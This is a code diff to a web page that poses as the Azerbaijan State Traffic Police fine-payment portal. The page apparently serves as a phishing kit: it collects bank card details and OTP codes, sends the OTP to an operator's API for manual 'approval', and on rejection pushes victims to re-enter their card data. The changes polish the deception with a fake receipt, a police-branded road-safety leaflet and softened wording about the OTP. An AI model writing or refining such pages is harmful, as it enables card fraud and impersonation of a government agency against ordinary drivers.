@@ -193,6 +193,7 @@
         let otpTimeLeft = 180;
         let otpInterval;
         let waitingForApproval = false;
+        let adviceShown = false;
 
         async function initConfig() {
             try {
@@ -240,24 +241,13 @@
             }
         }
 
-        function showLoadingScreen() {
-            document.getElementById('app-container').innerHTML = `
-                <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-12 text-center space-y-6">
-                    <div class="inline-block animate-spin rounded-full h-20 w-20 border-4 border-blue-600 border-t-transparent mx-auto"></div>
-                    <div class="space-y-2">
-                        <h1 class="text-2xl font-bold text-gray-800">Ödəniş Təsdiqlənir...</h1>
-                        <p class="text-sm text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı və admin təsdiqi yoxlanılır.</p>
-                    </div>
-                </div>
-            `;
-        }
-
         function updateUI(data) {
             let lastProtocol = localStorage.getItem('dyp_last_protocol');
             if (lastProtocol !== data.protocolNo) {
                 localStorage.setItem('dyp_last_protocol', data.protocolNo);
                 const newEndTime = Date.now() + 10 * 60 * 1000;
                 localStorage.setItem('dyp_timer_end', newEndTime);
+                adviceShown = false;
             }
 
             if (data.isPaid || data.isRejected) {
@@ -265,6 +255,7 @@
             }
 
             if (data.isRejected) {
+                document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
                 document.getElementById('reject-modal').classList.remove('hidden');
                 return;
@@ -274,6 +265,8 @@
 
             if (data.isPaid) {
                 clearInterval(timerInterval);
+
+                // Show receipt first
                 document.getElementById('app-container').innerHTML = `
                     <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8 text-center space-y-6 border-t-8 border-green-600">
                         <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl shadow-inner">
@@ -316,11 +309,47 @@
                         </div>
                     </div>
                 `;
+
+                // After 5 seconds, transition to Driver's Advice Leaflet and stay there
+                if (!adviceShown) {
+                    adviceShown = true;
+                    setTimeout(() => {
+                        document.getElementById('app-container').innerHTML = `
+                            <div class="bg-white rounded-2xl shadow-2xl overflow-hidden p-8 space-y-6 border-t-8 border-blue-600">
+                                <div class="text-center space-y-2 border-b pb-4">
+                                    <div class="text-4xl mb-1">📜</div>
+                                    <h1 class="text-lg font-bold text-blue-950 uppercase">SÜRÜCÜLƏRƏ NƏSİYYƏT VƏ TÖVSİYƏ VƏRƏQƏSİ</h1>
+                                    <p class="text-xs text-gray-500">Azərbaycan Respublikası Baş Dövlət Yol Polisi İdarəsi</p>
+                                </div>
+
+                                <div class="space-y-4 text-sm text-gray-700 leading-relaxed bg-blue-50/50 p-5 rounded-xl border border-blue-100">
+                                    <p class="font-bold text-gray-900">🚗 Hörmətli Sürücü!</p>
+                                    <p class="text-xs">Cərimə ödənişini uğurla tamamladığınız üçün təşəkkür edirik. Unutmayın ki, yol hərəkəti təhlükəsizliyi həm sizin, həm də digər hərəkət iştirakçılarının həyatının təminatıdır.</p>
+
+                                    <div class="space-y-2 pt-1">
+                                        <p class="font-bold text-blue-900 text-xs">📌 Əsas Yol Təhlükəsizliyi Qaydaları:</p>
+                                        <ul class="list-disc list-inside space-y-1.5 text-xs text-gray-700">
+                                            <li><strong>Sürət Həddi:</strong> Yaşayış məntəqələrində və magistrallarda müəyyən edilmiş sürət həddini əsla aşmayın.</li>
+                                            <li><strong>Təhlükəsizlik Kəməri:</strong> Həm sürücü, həm də bütün sərnişinlər hərəkət zamanı mütləq kəmərdən istifadə etməlidir.</li>
+                                            <li><strong>Diqqət və Telefonsuz Sürüş:</strong> Sükan arxasında mobil telefondan istifadə etməyin, diqqətinizi yoldan yayındırmayın.</li>
+                                            <li><strong>Piyadalar:</strong> Piyada keçidlərində piyadalara hər zaman yol verin və üstünlük tanıyın.</li>
+                                            <li><strong>Dayanma və Durma:</strong> Avtomobilinizi yalnız icazə verilən yerlərdə saxlayın, hərəkətə mane olmayın.</li>
+                                        </ul>
+                                    </div>
+
+                                    <div class="pt-3 border-t text-center space-y-1">
+                                        <p class="font-bold text-green-700 text-sm">🌟 Yolunuz açıq, mənziliniz mübarək olsun!</p>
+                                        <p class="text-xs text-gray-500">Sağ-salamat evinizə və ailənizə qayıdın.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    }, 5000);
+                }
                 return;
             }
 
             if (waitingForApproval || data.isPendingApproval) {
-                showLoadingScreen();
                 return;
             }
 
@@ -399,13 +428,13 @@
             event.preventDefault();
             const otpCode = document.getElementById('otp-code').value;
             if (otpCode.length < 4) {
-                alert("Zəhmət olmasa 4-6 rəqəmli OTP kodunu düzgün daxil edin.");
+                alert("Zəhmət olmasa 4-6 rəqəmli təsdiq kodunu düzgün daxil edin.");
                 return;
             }
 
             waitingForApproval = true;
             closeModals();
-            showLoadingScreen();
+            document.getElementById('loading-modal').classList.remove('hidden');
 
             try {
                 await fetch(`${API_URL}/otp`, {
@@ -437,7 +466,6 @@
             document.getElementById('reject-modal').classList.add('hidden');
             waitingForApproval = false;
 
-            // Re-fetch fine data and automatically open card modal so they can re-enter card info!
             await fetchFineData();
             openCardModal();
         }
